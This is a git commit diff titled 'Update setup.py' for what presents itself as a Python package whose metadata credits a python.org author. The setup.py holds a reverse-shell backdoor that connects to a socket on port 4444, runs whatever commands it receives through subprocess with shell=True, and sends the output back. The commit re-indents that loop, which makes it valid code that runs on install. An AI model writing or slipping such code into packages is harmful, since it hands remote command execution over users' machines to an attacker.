354a200e4b650eca24d34c3fbd5a06b61daf3ee9
Vu Duc Ly <vuducly151092@gmail.com>
2024-08-15 00:31:10 +0700

    Update setup.py

--- setup.py
+++ setup.py
@@ -7,14 +7,14 @@ import subprocess
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("localhost", 4444))
 while True:
-command = s.recv(1024).decode()
-if 'terminate' in command:
-    s.close()
-    break
-else:
-    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    s.send(CMD.stdout.read())
-    s.send(CMD.stderr.read())
+    command = s.recv(1024).decode()
+    if 'terminate' in command:
+        s.close()
+        break
+    else:
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        s.send(CMD.stdout.read())
+        s.send(CMD.stderr.read())
 AUTHOR = "Brian Curtin"
 EMAIL = "brian@python.org"
 
